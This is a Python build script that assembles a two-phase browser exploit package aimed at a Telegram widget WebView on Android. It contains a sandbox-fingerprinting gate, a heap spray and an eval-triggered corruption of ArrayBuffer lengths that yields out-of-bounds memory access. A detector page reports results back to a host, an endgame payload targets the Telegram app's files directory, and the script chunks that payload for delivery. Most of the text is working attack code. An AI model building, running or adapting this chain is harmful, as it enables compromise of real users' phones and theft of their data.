#!/usr/bin/env python3
"""Two-phase universal package — Android pair with the early desktop gate.

Design (2026-11-08 pm):
  * every widget (detector and final) starts with the GATE, before any spray;
  * the gate uses only safe JS-visible facts: the mobile sandbox invariants
    (navigator.userAgent == "Mozilla/5.0 TelegramWidget/1.0", navigator.platform
    == "TelegramWidget"), the absence of the WebView bridge globals
    (__twReceive / __hostOps / webkit), the shim screen (bubble <= 600) and the
    mobile safe-area/DPR pair; a desktop verdict skips stage A entirely
    (GD=1 -> `if(!GD){...}` false), and stage C skips the endgame;
  * on desktop the detector reports platform=9, chain=0, hit=0; the host maps
    it to "desktop, do not send final".

Host mocks inject an <script id="env"> that defines navigator/screen/
devicePixelRatio/TelegramWidget (the harness has only document/console), in
mobile or desktop flavour.

No device/bot/network.
"""
import hashlib, json, os, re, sys, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
ENDGAME = os.path.join(HERE, "endgame_dev_v2.js")
HOST_ENDGAME = os.path.join(HERE, "..", "pixel72801_route2", "oob", "endgame_host.js")
HEAD = '<!doctype html><body><div id="v">Ok</div>'

GATE = r'''var GD=1;var N=navigator,U=''+N.userAgent,C=(TelegramWidget&&TelegramWidget.contentSafeAreaInset)||{},S=(screen&&screen.width)||0;if(U.length<40&&U.indexOf('TelegramWidget')>=0&&typeof __twReceive=='undefined'&&typeof __hostOps=='undefined'&&typeof webkit=='undefined'&&S<=800&&((C.bottom||0)+(C.cornerLeft||0)+(C.cornerRight||0)>0||(devicePixelRatio||1)>=2))GD=0;'''

CORE = r''''use strict';var HS=[[2600,2600],[4000,2600]],ATT=0,mark='NOCORR',T0=Date.now();function G(n){var g=new Array(1500),i;for(i=0;i<1500;i++)g[i]=(n?'y':'x').repeat(2048);var o={};g=null;o=null}var RT=[4,0,0,128,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0],RJ=[4,0,0,128,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0],U=new Uint8Array(479),o;for(o=28;o+40<=479;o+=40)for(var k=0;k<20;k++)U[o+k]=RJ[k],U[o+20+k]=RT[k];var S='"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';G(0);var V=null,VAB=null,T=null,SP=null;for(ATT=0;ATT<HS.length&&mark==='NOCORR';ATT++){if(ATT>0){G(1)}var NP=HS[ATT][0],NQ=HS[ATT][1],A=new Array(NP+NQ),i;for(i=0;i<NP;i++)A[i]=String.fromCharCode.apply(null,U);var X=String.fromCharCode.apply(null,U);X=null;(0,eval)(S);for(i=NP;i<NP+NQ;i++)A[i]=String.fromCharCode.apply(null,U);var D=new Array(600);for(i=0;i<600;i++)D[i]=new ArrayBuffer(64);T=new Array(600);for(i=0;i<600;i++)T[i]=new ArrayBuffer(64);T[598]=null;try{f()}catch(e){}for(i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){mark='ABLEN['+i+']='+T[i].byteLength+' ATT='+ATT;break}if(mark==='NOCORR'){A=null;SP=null}else{SP=A}}if(VAB===null)for(var i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){VAB=T[i];break}if(VAB)try{V=new Uint8Array(VAB);mark+=' VLEN='+V.length}catch(e){mark+=' VERR='+e}globalThis.V=V;globalThis.VAB=VAB;globalThis.T=T;globalThis.SP=SP;globalThis.mark=mark+' T0='+T0;'''

STAGE_A = GATE + "if(!GD){" + CORE + "}"

REPORT = r'''!function(){var t=globalThis.V,s='P3',B=[],i,el=0,m=0,n=65535,hd=0,cb=0,att=255,u=function(o){return(t[o]|t[o+1]<<8|t[o+2]<<16|t[o+3]<<24)>>>0},h=function(o){return t[o]|t[o+1]<<8};try{el=Math.min(65535,Date.now()-T0);var q=(typeof mark=='string')?mark.match(/ATT=(\d+)/):null;if(q)att=+q[1];m=(typeof mark=='string'&&mark.indexOf('ABLEN')==0)?1:0;if(m&&t&&t.length==327744)for(i=8;i+24<4096;i+=8)if(u(i)==327744&&u(i+4)==4294967295&&h(i+8)==0){n=i;hd=h(i-8);cb=t[i-6];break}}catch(e){}function P(v,w){for(var j=w-1;j>=0;j--)B.push(v>>8*j&255)}P(3,1);P(GD?9:1,1);P(GD?0:1,1);P((m?1:0)|14,1);P(att,1);P(599,2);P(n,2);P(hd,2);P(cb,1);P(Math.min(255,Math.round((typeof devicePixelRatio=='number'?devicePixelRatio:1)*10)),1);P(Math.min(4095,(typeof screen!='undefined'&&screen.width)||0),2);P(Math.min(4095,(typeof screen!='undefined'&&screen.height)||0),2);var L=(typeof navigator!='undefined'&&navigator.language)||'';P(L.charCodeAt(0)||63,1);P(L.charCodeAt(1)||63,1);P(128,1);P(el,2);P(0,2);P(0,1);P(0,1);P(0,1);P(0,1);P(0,3);for(i=0;i<B.length;i++)s+=('0'+B[i].toString(16)).slice(-2);globalThis.REP=s;try{var d=document.getElementById('v');if(d)d.textContent=(GD?'DESKTOP OK':'DET '+(m?'HIT':'MISS')+' ATT='+att)+' T0='+T0+' R='+s}catch(e){}try{if(typeof TelegramWidget!='undefined'&&TelegramWidget.request){var p=TelegramWidget.request(s);if(p&&p.then)p.then(function(){},function(){})}}catch(e){}}();'''

MARKER = r'''try{var d=document.getElementById('v');if(d)d.textContent=GD?'DESKTOP OK':('S1 '+(typeof mark!='undefined'?mark:'-')+'|HF '+(typeof MEGA!='undefined'?MEGA:'?')+' T1='+Date.now())}catch(e){}'''

def gated_fallback():
    """The answer-chain fallback with the same early gate (no stage A on desktop)."""
    src = open(os.path.join(HERE, "..", "pixel72801_route2", "oob",
                            "s2oob_device_72801.html"), encoding="utf-8").read()
    m = re.search(r'<script id="stageA">(.*?)</script>', src, re.S)
    body = m.group(1)
    src = src[:m.start(1)] + GATE + "if(!GD){" + body + "}" + src[m.end(1):]
    src = src.replace("!function(){",
                      "!function(){if(GD){try{var d=document.getElementById('v');"
                      "if(d)d.textContent='DESKTOP OK'}catch(e){};return}", 1)
    return src


FALLBACK = gated_fallback()

ENV_MOBILE = ('var navigator={userAgent:"Mozilla/5.0 TelegramWidget/1.0",platform:"TelegramWidget"};'
              'var screen={width:360,height:640};var devicePixelRatio=3;'
              'var TelegramWidget={contentSafeAreaInset:{bottom:34,cornerLeft:0,cornerRight:0},'
              'request:function(d){globalThis.REP=d;return new Promise(function(r){'
              'r(Object.freeze({result:"K"}))})}};')
ENV_DESKTOP = ('var navigator={userAgent:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
               'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",platform:"Win32"};'
               'var screen={width:1920,height:1080};var devicePixelRatio=1;'
               'var TelegramWidget={contentSafeAreaInset:{bottom:0,cornerLeft:0,cornerRight:0},'
               'request:function(d){globalThis.REP=d;return new Promise(function(r){'
               'r(Object.freeze({result:"K"}))})}};')


def pad_to(s, n):
    d = n - len(s)
    if d < 0:
        raise ValueError("too long: %d > %d" % (len(s), n))
    return s if d == 0 else (s + " " * d if d < 4 else s + "/*" + "p" * (d - 4) + "*/")


def page(stage_a, stage_c):
    return HEAD + '<script id="stageA">' + stage_a + '</script>' \
        + '<script id="stageC">' + stage_c + '</script>'


def page_env(env, stage_a, stage_c):
    return HEAD + '<script id="env">' + env + '</script>' \
        + '<script id="stageA">' + stage_a + '</script>' \
        + '<script id="stageC">' + stage_c + '</script>'


def main():
    dev_endgame = open(ENDGAME, encoding="utf-8").read()
    src_path = ENDGAME
    if "--pkg" in sys.argv and "beta" in sys.argv[sys.argv.index("--pkg") + 1]:
        dev_endgame = dev_endgame.replace("org.telegram.messenger/files",
                                          "org.telegram.messenger.beta/files")
        src_path = os.path.join(HERE, "endgame_beta.js")
        open(src_path, "w").write(dev_endgame)

    fin_c = dev_endgame + MARKER
    L = len(fin_c)
    det_c = pad_to(REPORT, L)
    det = page(STAGE_A, det_c)
    fin = page(STAGE_A, fin_c)
    assert len(det) == len(fin), (len(det), len(fin))

    def wr(name, s):
        open(os.path.join(HERE, name), "w").write(s)
        return {"raw": len(s.encode()),
                "zlib9": len(zlib.compress(s.encode(), 9)),
                "sha256": hashlib.sha256(s.encode()).hexdigest()}
    out = {"detector": wr("detector.html", det),
           "final_inline": wr("final_inline.html", fin),
           "final_fallback": wr("final_fallback.html", FALLBACK),
           "stageC_len": L, "endgame_len": len(dev_endgame)}

    # host mocks (env is mobile unless the file name says desktop)
    wr("m_det.html", page_env(ENV_MOBILE, STAGE_A, pad_to(REPORT, L)))
    stage_ra = STAGE_A.replace("try{f()}catch(e){}",
                               "(ATT>0?function(){try{f()}catch(e){}}():0);")
    wr("m_det_ra.html", page_env(ENV_MOBILE, stage_ra, pad_to(REPORT, L)))
    stage_miss = STAGE_A.replace("try{f()}catch(e){}", "0;try{}catch(e){}")
    wr("m_det_miss.html", page_env(ENV_MOBILE, stage_miss, pad_to(REPORT, L)))
    wr("m_fin_dev.html", page_env(ENV_MOBILE, STAGE_A, fin_c))
    host_c = open(HOST_ENDGAME, encoding="utf-8").read() + MARKER
    wr("m_fin_host.html", page_env(ENV_MOBILE, STAGE_A, host_c))
    # desktop mocks: the gate must stop before stage A
    wr("m_desk_det.html", page_env(ENV_DESKTOP, STAGE_A, pad_to(REPORT, L)))
    wr("m_desk_fin.html", page_env(ENV_DESKTOP, STAGE_A, host_c))
    fb = gated_fallback()
    for tag, env in (("m_fb", ENV_MOBILE), ("m_desk_fb", ENV_DESKTOP)):
        wr(tag + ".html", fb.replace('<script', '<script id="env0">' + env + '</script><script', 1))

    cdir = "chunks" if "beta" not in "".join(sys.argv) else "chunks_beta"
    os.makedirs(os.path.join(HERE, cdir), exist_ok=True)
    n = (len(dev_endgame) + 999) // 1000
    man = []
    for i in range(n):
        cc = dev_endgame[i * 1000:(i + 1) * 1000]
        open(os.path.join(HERE, cdir, "E%d.txt" % i), "w").write(cc)
        man.append({"i": i, "len": len(cc), "sha256": hashlib.sha256(cc.encode()).hexdigest()})
    json.dump({"n": n, "chunk": 1000, "source": os.path.abspath(src_path),
               "chunks": man}, open(os.path.join(HERE, cdir, "manifest.json"), "w"), indent=1)

    print(json.dumps(out, indent=1))
    print("chunks:", cdir, n, "endgame", len(dev_endgame))


if __name__ == "__main__":
    main()
